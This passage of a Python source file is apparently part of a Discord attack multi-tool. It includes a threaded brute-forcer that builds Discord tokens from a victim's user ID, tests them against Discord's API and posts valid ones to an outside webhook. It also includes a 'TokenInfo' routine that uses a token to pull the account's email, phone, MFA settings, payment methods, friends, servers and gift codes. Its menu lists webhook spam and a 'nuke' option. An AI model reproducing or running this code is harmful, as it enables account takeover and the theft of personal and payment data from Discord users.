    print(F"{Fore.RED} ░                   ░                           ░                                                             ░       ")  
    try:
        userid = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Victime ID -> {reset}")
        OnePartToken =  str(base64.b64encode(userid.encode("utf-8")), "utf-8").replace("=", "")
        print(f'{BEFORE + current_time_hour() + AFTER} {INFO} Part One Token: {white}{OnePartToken}.{reset}')

        brute = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Find the second part by brute force ? (y/n) -> {reset}")
        if not brute in ['y', 'Y', 'Yes', 'yes', 'YES']:
            Continue()
            Reset()

        webhook = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook ? (y/n) -> {reset}")
        if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
            webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
            CheckWebhook(webhook_url)

        try:
            threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))
        except:
            ErrorNumber()


        def send_webhook(embed_content):
            payload = {
            'embeds': [embed_content],
            'username': username_webhook,
            'avatar_url': avatar_webhook
            }

            headers = {
            'Content-Type': 'application/json'
            }

            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check():
            first = OnePartToken
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
            third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
            token = f"{first}.{second}.{third}"

            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook in ['y']:
                        embed_content = {
                        'title': f'Token Valid !',
                        'description': f"**Token:**\n```{token}```",
                        'color': color_webhook,
                        'footer': {
                        "text": username_webhook,
                        "icon_url": avatar_webhook,
                        }
                        }
                        send_webhook(embed_content)
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
                    else:
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {white}Valid{green}  Token: {white}{token}{green}")
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Invalid{red} Token: {white}{token}{red}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {white}Error{red} Token: {white}{token}{red}")

        def request():
            threads = []
            try:
                for _ in range(int(threads_number)):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                ErrorNumber()

            for thread in threads:
                thread.join()

        while True:
            request()
    except Exception as e:
        Error(e)




def TokenInfo():
    try:
        token_discord = Choice1TokenDiscord()
        print(f"{BEFORE + AFTER} {WAIT} Information Recovery..{reset}")
        try:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()

            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})

            if response.status_code == 200: status = "Valid"
            else: status = "Invalid"

            username_discord = api.get('username', "None") + '#' + api.get('discriminator', "None")
            display_name_discord = api.get('global_name', "None")
            user_id_discord = api.get('id', "None")
            email_discord = api.get('email', "None")
            email_verified_discord = api.get('verified', "None")
            phone_discord = api.get('phone', "None")
            mfa_discord = api.get('mfa_enabled', "None")
            country_discord = api.get('locale', "None")
            avatar_discord = api.get('avatar', "None")
            avatar_decoration_discord = api.get('avatar_decoration_data', "None")
            public_flags_discord = api.get('public_flags', "None")
            flags_discord = api.get('flags', "None")
            banner_discord = api.get('banner', "None")
            banner_color_discord = api.get('banner_color', "None")
            accent_color_discord = api.get("accent_color", "None")
            nsfw_discord = api.get('nsfw_allowed', "None")

            try: created_at_discord = datetime.fromtimestamp(((int(api.get('id', 'None')) >> 22) + 1420070400000) / 1000, timezone.utc)
            except: created_at_discord = "None"

            try:
                if api.get('premium_type', 'None') == 0:
                    nitro_discord = 'False'
                elif api.get('premium_type', 'None') == 1:
                    nitro_discord = 'Nitro Classic'
                elif api.get('premium_type', 'None') == 2:
                    nitro_discord = 'Nitro Boosts'
                elif api.get('premium_type', 'None') == 3:
                    nitro_discord = 'Nitro Basic'
                else:
                    nitro_discord = 'False'
            except:
                nitro_discord = "None"

            try: avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.png"
            except: avatar_url_discord = "None"
            
            try:
                linked_users_discord = api.get('linked_users', 'None')
                linked_users_discord = ' / '.join(linked_users_discord)
                if not linked_users_discord.strip():
                    linked_users_discord = "None"
            except:
                linked_users_discord = "None"
            
            try:
                bio_discord = "\n" + api.get('bio', 'None')
                if not bio_discord.strip() or bio_discord.isspace():
                    bio_discord = "None"
            except:
                bio_discord = "None"
            
            try:
                authenticator_types_discord = api.get('authenticator_types', 'None')
                authenticator_types_discord = ' / '.join(authenticator_types_discord)
            except:
                authenticator_types_discord = "None"

            try:
                guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
                if guilds_response.status_code == 200:
                    guilds = guilds_response.json()
                    try:
                        guild_count = len(guilds)
                    except:
                        guild_count = "None"
                    try:
                        owner_guilds = [guild for guild in guilds if guild['owner']]
                        owner_guild_count = f"({len(owner_guilds)})"
                        owner_guilds_names = [] 
                        if owner_guilds:
                            for guild in owner_guilds:
                                owner_guilds_names.append(f"{guild['name']} ({guild['id']})")
                            owner_guilds_names = "\n" + "\n".join(owner_guilds_names)
                    except:
                        owner_guild_count = "None"
                        owner_guilds_names = "None" 
            except:
                owner_guild_count = "None"
                guild_count = "None"
                owner_guilds_names = "None"


            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
                if billing_discord:
                    payment_methods_discord = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            payment_methods_discord.append('CB')
                        elif method['type'] == 2:
                            payment_methods_discord.append("Paypal")
                        else:
                            payment_methods_discord.append('Other')
                    payment_methods_discord = ' / '.join(payment_methods_discord)
                else:
                    payment_methods_discord = "None"
            except:
                payment_methods_discord = "None"
            
            try:
                friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
                if friends:
                    friends_discord = []
                    for friend in friends:
                        unprefered_flags = [64, 128, 256, 1048704]
                        data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})"

                        if len('\n'.join(friends_discord)) + len(data) >= 1024:
                            break

                        friends_discord.append(data)

                    if len(friends_discord) > 0:
                        friends_discord = '\n' + ' / '.join(friends_discord)
                    else:
                        friends_discord = "None"
                else:
                    friends_discord = "None"
            except:
                friends_discord = "None"

            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
                if gift_codes:
                    codes = []
                    for gift_codes_discord in gift_codes:
                        name = gift_codes_discord['promotion']['outbound_title']
                        gift_codes_discord = gift_codes_discord['code']
                        data = f"Gift: {name}\nCode: {gift_codes_discord}"
                        if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                            break
                        gift_codes_discord.append(data)
                    if len(gift_codes_discord) > 0:
                        gift_codes_discord = '\n\n'.join(gift_codes_discord)
                    else:
                        gift_codes_discord = "None"
                else:
                    gift_codes_discord = "None"
            except:
                gift_codes_discord = "None"

        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error when retrieving information: {white}{e}")

        Slow(f"""
    {white}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    {INFO_ADD} Status       : {white}{status}{red}
    {INFO_ADD} Token        : {white}{token_discord}{red}
    {INFO_ADD} Username     : {white}{username_discord}{red}
    {INFO_ADD} Display Name : {white}{display_name_discord}{red}
    {INFO_ADD} Id           : {white}{user_id_discord}{red}
    {INFO_ADD} Created      : {white}{created_at_discord}{red}
    {INFO_ADD} Country      : {white}{country_discord}{red}
    {INFO_ADD} Email        : {white}{email_discord}{red}
    {INFO_ADD} Verified     : {white}{email_verified_discord}{red}
    {INFO_ADD} Phone        : {white}{phone_discord}{red}
    {INFO_ADD} Nitro        : {white}{nitro_discord}{red}
    {INFO_ADD} Linked Users : {white}{linked_users_discord}{red}
    {INFO_ADD} Avatar Decor : {white}{avatar_decoration_discord}{red}
    {INFO_ADD} Avatar       : {white}{avatar_discord}{red}
    {INFO_ADD} Avatar URL   : {white}{avatar_url_discord}{red}
    {INFO_ADD} Accent Color : {white}{accent_color_discord}{red}
    {INFO_ADD} Banner       : {white}{banner_discord}{red}
    {INFO_ADD} Banner Color : {white}{banner_color_discord}{red}
    {INFO_ADD} Flags        : {white}{flags_discord}{red}
    {INFO_ADD} Public Flags : {white}{public_flags_discord}{red}
    {INFO_ADD} NSFW         : {white}{nsfw_discord}{red}
    {INFO_ADD} Multi-Factor Authentication : {white}{mfa_discord}{red}
    {INFO_ADD} Authenticator Type          : {white}{authenticator_types_discord}{red}
    {INFO_ADD} Billing      : {white}{payment_methods_discord}{red}
    {INFO_ADD} Gift Code    : {white}{gift_codes_discord}{red}
    {INFO_ADD} Guilds       : {white}{guild_count}{red}
    {INFO_ADD} Owner Guilds : {white}{owner_guild_count}{owner_guilds_names}{red}
    {INFO_ADD} Bio          : {white}{bio_discord}{red}
    {INFO_ADD} Friend       : {white}{friends_discord}{red}
    {white}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        """)
        Continue()
        Reset()
    except Exception as e:
        Error(e)



while True:
     menu()
     print("")
     print("")
     option = int(input("Choose your Option: "))

     if option == 1:
            option1()
            os.system("cls")
     elif option ==2:
            website_scanner_menu()
            os.system("cls")
     elif option ==3:
            IP_Lookup()
            os.system("cls")
     elif option == 4:
            option4()
            os.system("cls")
     elif option == 5:
            WebhookSpam()
            input("Press Enter to continue")
            os.system("cls")
     elif option == 6:
            starte_nuke()
            os.system("cls")
     elif option == 7:
            bruhmoment()
            os.system("cls")
     elif option == 8:
            TokenInfo()
            os.system("cls")
     else:
            print("Invaid option.")
            print("Thanks for using this Tool! Goodbye!")
            time.sleep(1.5)
            break